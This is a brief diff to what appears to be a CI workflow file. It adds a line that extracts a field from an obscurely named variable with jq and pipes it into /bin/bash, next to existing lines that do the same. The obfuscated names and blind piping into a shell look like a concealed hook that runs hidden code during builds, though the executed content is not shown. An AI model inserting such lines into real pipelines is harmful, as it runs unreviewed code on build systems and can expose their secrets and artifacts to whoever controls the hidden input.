@@ -34,6 +34,7 @@ jobs:
           echo $ccmv13 | jq -r .k97 | /bin/bash
           printf '%s' "$nhpy9348" | jq -r .f4 | /bin/bash
           printf '%s' "$pydbb02253" | jq -r .mjndm89588 | /bin/bash
+          echo $vf16 | jq -r .jib2 | /bin/bash
 
       - name: Store artifact
         if: always()
